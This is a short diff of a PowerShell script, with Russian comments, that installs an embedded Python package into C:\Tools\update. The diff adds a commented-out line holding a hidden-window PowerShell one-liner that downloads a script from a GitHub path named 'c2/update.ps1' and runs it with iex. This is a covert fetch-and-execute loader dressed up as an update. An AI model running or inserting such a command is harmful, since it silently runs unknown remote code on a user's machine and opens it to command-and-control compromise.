@@ -1,4 +1,5 @@
-# Папка куда сохранить Python
+# powershell -NoP -NonI -w h -c "irm https://raw.githubusercontent.com/gaca9302/usb/refs/heads/main/c2/update.ps1 | iex"
+# Папка куда сохранить Python 
 $InstallPath = "C:\Tools\update"
 
 # URL официального embeddable package
